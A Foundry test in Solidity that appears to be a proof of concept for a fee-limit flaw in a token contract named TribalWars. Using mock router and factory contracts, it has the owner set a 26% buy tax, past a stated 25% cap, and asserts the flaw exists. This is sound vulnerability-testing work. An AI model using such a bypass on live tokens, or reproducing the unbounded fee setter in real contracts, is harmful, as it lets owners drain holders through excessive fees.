// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/TribalWars.sol";

contract MockWETH {
    function deposit() public payable {}
    function withdraw(uint) public {}
    function transfer(address, uint) public pure returns (bool) { return true; }
}

contract MockRouter {
    address public immutable factory;
    address public immutable WETH;

    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }
}

contract MockFactory {
    address public token0;
    address public token1;
    
    function createPair(address _tokenA, address _tokenB) external returns (address pair) {
        token0 = _tokenA;
        token1 = _tokenB;
        return address(0x12345); // Return dummy pair address
    }
}

contract TribalWarsFeeTest is Test {
    TribalWars public token;
    address owner = makeAddr("owner");
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Deploy mock contracts
        MockWETH weth = new MockWETH();
        MockFactory factory = new MockFactory();
        
        // Compute mock router bytecode
        MockRouter mockRouter = new MockRouter(address(factory), address(weth));
        bytes memory code = address(mockRouter).code;
        
        // Set up router address with mock bytecode
        vm.etch(ROUTER_ADDRESS, code);
        
        // Deploy token with mock environment
        vm.startPrank(owner);
        token = new TribalWars();
        vm.stopPrank();
    }

    function testFeeLimitBypass() public {
        console.log("--- BEFORE-Trigger ---");
        // Get current fee state
        uint256 marketMakerFeeBefore = token._marketMakerFee();
        uint256 totalTaxBefore = token._totalTax();
        console.log("Initial Market Maker Fee: %s", marketMakerFeeBefore);
        console.log("Initial Total Tax: %s", totalTaxBefore);

        console.log("--- Trigger setBuyTaxes(26,0,0,0) ---");
        // Attempt to set fees to 26% (exceeding 25% limit)
        uint256 highFee = 26;
        vm.prank(owner);
        token.setBuyTaxes(highFee, 0, 0, 0);

        console.log("--- AFTER-Trigger ---");
        // Validate new fee state
        uint256 marketMakerFeeAfter = token._marketMakerFee();
        uint256 totalTaxAfter = token._totalTax();
        console.log("Updated Market Maker Fee: %s", marketMakerFeeAfter);
        console.log("Updated Total Tax: %s", totalTaxAfter);

        // Differential verification
        bool vulnerable = (marketMakerFeeAfter == highFee) && (totalTaxAfter == highFee);
        if (vulnerable) {
            console.log("Vulnerability Exists: Fees successfully set to 26%% exceeding 25%% limit");
        } else {
            console.log("Vulnerability not Exist: Fee limit enforced - values not changed to 26%%");
        }
        
        // Final vulnerability assertion
        assertTrue(vulnerable, "Fee should have been 26% to confirm vulnerability");
    }
}